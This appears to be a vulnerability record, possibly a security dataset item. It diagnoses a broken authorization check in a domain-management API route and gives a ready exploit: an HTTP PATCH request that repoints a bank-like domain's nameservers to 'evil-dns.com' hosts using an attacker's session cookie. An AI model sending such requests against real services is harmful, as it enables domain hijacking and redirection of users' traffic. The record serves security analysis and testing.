diagnosis: The route handler updates critical DNS routing attributes for a domain record using params.domainId. While it verifies the caller's login status with getServerSession, it fails to check if the caller is the owner or administrator of the domain, allowing arbitrary users to hijack domains and redirect traffic to malicious nameservers.
exploit_request:
PATCH /api/domains/dom_prod_bank_services/nameservers HTTP/1.1
Host: cloud.domaindns.com
Cookie: next-auth.session-token=<attacker_cookie>
Content-Type: application/json

{"nameservers": ["ns1.evil-dns.com", "ns2.evil-dns.com"], "targetIp": "198.51.100.22"}
